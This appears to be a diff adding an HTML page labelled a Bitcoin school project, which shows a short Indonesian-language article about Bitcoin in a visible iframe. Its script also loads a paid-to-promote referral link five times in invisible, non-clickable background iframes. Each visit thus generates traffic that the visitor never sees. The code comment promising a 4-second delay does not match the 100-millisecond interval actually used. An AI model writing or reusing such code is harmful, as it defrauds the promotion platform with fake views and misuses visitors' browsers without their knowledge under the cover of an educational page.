@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Bitcoin (School Project)</title>
+
+<style>
+    html, body {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+    }
+
+    iframe {
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+    }
+
+    /* iframe background (tidak terlihat tapi tetap load) */
+    .hidden {
+        opacity: 0;
+        pointer-events: none;
+    }
+</style>
+
+</head>
+<body>
+
+<!-- iframe ke-6 (langsung tampil) -->
+<iframe srcdoc="
+<html>
+<head>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    padding: 20px;
+    line-height: 1.6;
+}
+h1 {
+    color: #f7931a;
+}
+img {
+    max-width: 100%;
+    border-radius: 10px;
+    margin: 20px 0;
+}
+</style>
+</head>
+<body>
+
+<h1>Bitcoin: Mata Uang Digital Masa Depan</h1>
+
+<p>
+Bitcoin adalah mata uang digital pertama di dunia yang diperkenalkan pada tahun 2009 oleh seseorang atau kelompok dengan nama samaran Satoshi Nakamoto.
+</p>
+
+<img src='https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg' />
+
+<p>
+Berbeda dengan uang tradisional, Bitcoin tidak dikendalikan oleh pemerintah atau bank pusat. Semua transaksi dicatat dalam teknologi yang disebut blockchain.
+</p>
+
+<p>
+Keunggulan Bitcoin:
+</p>
+<ul>
+<li>Desentralisasi (tidak dikontrol pihak tertentu)</li>
+<li>Transparan</li>
+<li>Keamanan tinggi</li>
+<li>Bisa digunakan secara global</li>
+</ul>
+
+<p>
+Namun, Bitcoin juga memiliki risiko seperti volatilitas harga yang tinggi dan potensi penyalahgunaan.
+</p>
+
+<p>
+Meski begitu, banyak orang percaya bahwa Bitcoin adalah masa depan sistem keuangan digital.
+</p>
+
+</body>
+</html>
+"></iframe>
+
+<script>
+const link = "https://www.rotate4all.com/ptp/promote-299672";
+
+// load 5 iframe di background dengan jeda 4 detik
+for (let i = 0; i < 5; i++) {
+    setTimeout(() => {
+        let iframe = document.createElement('iframe');
+        iframe.src = link;
+        iframe.className = 'hidden';
+        document.body.appendChild(iframe);
+    }, i * 100);
+}
+</script>
+
+</body>
+</html>
